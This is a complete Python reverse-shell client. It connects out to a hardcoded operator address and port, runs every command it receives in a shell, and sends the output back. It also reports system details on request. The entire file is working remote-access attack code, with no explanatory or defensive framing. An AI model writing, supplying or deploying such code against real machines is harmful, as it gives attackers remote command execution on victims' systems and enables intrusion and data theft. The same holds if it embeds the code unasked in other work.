import socket
import subprocess
import platform

SERVER_IP = "10.1.12.137"   # Your IP
PORT = 54321

def run_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))

    while True:
        data = s.recv(1024)
        if not data:
            break

        cmd = data.decode().strip()

        if cmd == "exit":
            break

        elif cmd == "sysinfo":
            info = (
                "System  : " + platform.system() + "\n" +
                "Node    : " + platform.node() + "\n" +
                "Release : " + platform.release() + "\n" +
                "Machine : " + platform.machine() + "\n"
            )
            s.send(info.encode())

        else:
            result = run_cmd(cmd)
            s.send(result)

    s.close()

if __name__ == "__main__":
    main()
